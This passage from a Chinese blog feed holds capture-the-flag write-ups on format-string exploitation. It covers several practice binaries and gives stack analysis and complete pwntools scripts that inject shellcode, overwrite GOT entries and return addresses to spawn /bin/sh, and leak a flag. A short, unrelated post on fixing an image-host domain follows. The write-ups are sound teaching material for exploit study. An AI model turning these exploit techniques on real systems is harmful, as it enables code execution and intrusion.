raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>-—  </p><p>** 接下来的题，都是buf不再栈的上的题目。**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>可以看到nx保护是关闭的，可以想办法利用shellcode。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  while ( 1 )  {    result = (int)fgets(buf, 1024, stdin);    if ( !result )      break;    echo();  }  return result;}</code></pre><p>漏洞函数：</p><pre><code class="c">int make_response(){  return snprintf(response, 0x400u, buf);}</code></pre><p>代码十分简单，但是这次的漏洞函数变成了snprintf ，时刻注意偏移的计算是针对格式化字符串的偏移。且buf是在bss段上的，已经变得不是我们当初一样十分的好控制，此时就需要想办法好好利用栈上原来有的数据。</p><h3 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h3><pre><code class="html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ：</p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p><strong>也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用<code>%xc%4$hhn</code> 就可以修改0xffffd378（ebp3）。</strong><br><strong>将0xffffd378 改为指向ret address的栈地址  <code>0xffffd33c</code>  ：</strong></p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>改完也就是这样的效果。<br><strong>这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），</strong><br><strong>接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用<code>%xc%y$hhn</code> 就可以修改0x804852c（ret address）</strong></p><p>这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="保护和arch-5"><a href="#保护和arch-5" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./playfmt&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,26382)buf = 0x0804A060 + 0x40 #0x804a0a0offset1 = 6offset2 = 10info(&#39;---leak stack address---&#39;)io.recvuntil(&#39;\n=====================\n&#39;)io.sendline(&#39;%10$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))info(&#39;---change the retaddr---&#39;)key = int(str(hex(ret_stack_addr))[-2:],16)payload = &quot;%{}c%6$hhn&quot;.format(key)raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.recv()key2 = 0xa0a0payload = &quot;%{}c%10$hn&quot;.format(key2)payload = payload.ljust(0x40)payload += asm(shellcraft.sh())raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()sleep(0.1)io.sendline(&#39;quit&#39;)io.interactive()</code></pre><p>记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="arch和保护"><a href="#arch和保护" class="headerlink" title="arch和保护"></a>arch和保护</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开了nx了。</p><h3 id="ida分析-7"><a href="#ida分析-7" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )  {    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);    read(0, buf, 0x64u);    printf(buf);  }  puts(&quot;Wait a sec...&quot;);  sleep(3u);</code></pre><p>可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。</p><pre><code class="c">  execve(path, &amp;path, 0);</code></pre><p>且这一条可以给你拿到shell。</p><p>那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。<br>因为这里下面就调用一次sleep，就改它好了，基本不会出问题。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。</p><h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>此时的EBP = 0xffffd228 </p><pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)0020| 0xffffd1f4 --&gt; 0x00024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x00028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)0040| 0xffffd208 --&gt; 0x00044| 0xffffd20c --&gt; 0x00048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x00052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x00060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x00064| 0xffffd220 --&gt; 0x00068| 0xffffd224 --&gt; 0x10072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p>可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。</strong>然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./fsb&#39;)# s = ssh(#     host=&quot;pwnable.kr&quot;,#     port=2222,#     user=&quot;fsb&quot;,#     password=&quot;guest&quot;# )# io = s.run(&quot;/home/fsb/fsb&quot;)# io = shell.run(&quot;/home/fsb/fsb&quot;)sleep_got = 0x0804a008info(&#39;--------leak stack base:-------&#39;)io.recvuntil(&#39;strings(1)\n&#39;)io.sendline(&#39;%14$p&#39;)io.recvuntil(&#39;0x&#39;)stack_base = int(io.recv(8),16) - 80print(hex(stack_base))info(&#39;--------leak the point to main ebp:-------&#39;)io.recvuntil(&#39;strings(2)\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)point = int(io.recv(8),16)print(hex(point))info(&#39;--------write sleep_got to main_ebp :-------&#39;)io.recvuntil(&#39;strings(3)\n&#39;)key1 = 0x0804A008payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;io.sendline(payload)info(&#39;--------write tag to sleep_got :-------&#39;)tag = 0x869Foffset = (point - stack_base) / 4payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)io.recvuntil(&#39;strings(4)\n&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="保护和arch-6"><a href="#保护和arch-6" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-8"><a href="#ida分析-8" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>这一处会让栈的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。<br>（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。）</p><h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>仔细看下此时的栈情况 ，然后再次分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址</li></ul><p>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。<br>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以写system的内存地址上got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>这样再传过去一下<code>/bin/sh</code>即可。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continue# io = def fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。<h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3></li></ul><p>这个题教会我一定要<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="保护和arch-7"><a href="#保护和arch-7" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>CANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partial</code></pre><h3 id="ida分析-9"><a href="#ida分析-9" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s){  char *v1; // eax  char *result; // eax  puts(&quot;...&quot;);  v1 = strtok(s, &quot;|&quot;);  printf(v1);  while ( 1 )  {    result = strtok(0, &quot;|&quot;);    if ( !result )      break;    printf(result);  }  return result;}</code></pre><p>这里因为用strtok做处理，只有一次的传送机会，payload需要用<code>|</code>    分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。<br>并且存在后门函数：</p><pre><code>.text:080485AB                 push    ebp.text:080485AC                 mov     ebp, esp.text:080485AE                 sub     esp, 8.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);.text:080485B1                 sub     esp, 0Ch.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;.text:080485B9                 call    _system.text:080485BE                 add     esp, 10h.text:080485C1                 nop.text:080485C2                 leave.text:080485C3                 retn</code></pre><p>这下可以直接改ret address即可。</p><h3 id="gdb分析-3"><a href="#gdb分析-3" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>先观察一下ebp链是否存在 ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>是存在的，然后直接利用就好了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>然后接着利用漏洞，改一下返回地址到后门函数即可。</p><p>（这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。）</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;system_addr = 0x080485B4tag1 = 0x4ctag2 = 0x85abio = process(&#39;./xman_2019_format&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27012)payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)while True:    try:        io.recvuntil(&#39;...\n...\n&#39;)        io.sendline(payload)        sleep(0.1)        io.recvuntil(&#39;~&#39;)        io.sendline(&#39;ls&#39;)        io.recvline()        io.recvline()        io.interactive()        break    except EOFError :        io.close()        io = process(&#39;./xman_2019_format&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre><p>需要爆破栈。</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="保护和arch-8"><a href="#保护和arch-8" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开启了RELRO，这样就无法got hijack了</p><h3 id="ida分析-10"><a href="#ida分析-10" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdb分析-4"><a href="#gdb分析-4" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>其会被读到堆上。紧接着跟到格式化字符串漏洞处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>看一下这个堆地址是否被程序操作修改了：</p><pre><code>gdb-peda$ x/s 0x8050b700x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。<br>第一步：<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理：</p><pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>此时再修改ebp1上的值，改成刚刚的堆地址 ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>这样exp写的时候，找好偏移%s一下就出来了。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = remote(&#39;node3.buuoj.cn&#39;,27816)io = process(&#39;./1&#39;)io.recvuntil(&#39;Magic echo Server&#39;)io.recvuntil(&#39;=====================\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)flag = int(io.recv(8),16)print(hex(flag))key = int((hex(flag))[-4:],16) - 32 -12 -4print(&#39;key&#39;+ hex(key))# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%6$p&#39;)io.recvuntil(&#39;0x&#39;)stack_point = int(io.recv(8),16) + 16tag1 = int((hex(stack_point))[-2:],16)print(hex(tag1))payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1&#39;)payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;2&#39;)io.sendline(&#39;%18$s&#39;)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞题目练习&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞题目练习&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞题目练习&quot;&gt;&lt;/a&gt;格式化字符串漏洞题目练习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>修复七千云外链失效</title>
    <link href="http://chumen77.xyz/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <id>http://chumen77.xyz/2020/03/12/修复七千云外链失效/</id>
    <published>2020-03-12T15:17:10.000Z</published>
    <updated>2020-03-13T02:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="修复七千云外链失效"><a href="#修复七千云外链失效" class="headerlink" title="修复七千云外链失效"></a>修复七千云外链失效</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。</p><h2 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h2><h3 id="绑定创建域名"><a href="#绑定创建域名" class="headerlink" title="绑定创建域名"></a>绑定创建域名</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。<br>创建成功后，会提示你复制<strong>CNAME</strong>，复制一下，去往你自己的域名网站，我用的是阿里云。</p><h3 id="去自己的dns解析平台"><a href="#去自己的dns解析平台" class="headerlink" title="去自己的dns解析平台"></a>去自己的dns解析平台</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。</p><h3 id="修改upic设置"><a href="#修改upic设置" class="headerlink" title="修改upic设置"></a>修改upic设置</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;修复七千云外链失效&quot;&gt;&lt;a href=&quot;#修复七千云外链失效&quot; class=&quot;headerlink&quot; title=&quot;修复七千云外链失效&quot;&gt;&lt;/a&gt;修复七千云外链失效&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞小总结（上）</title>
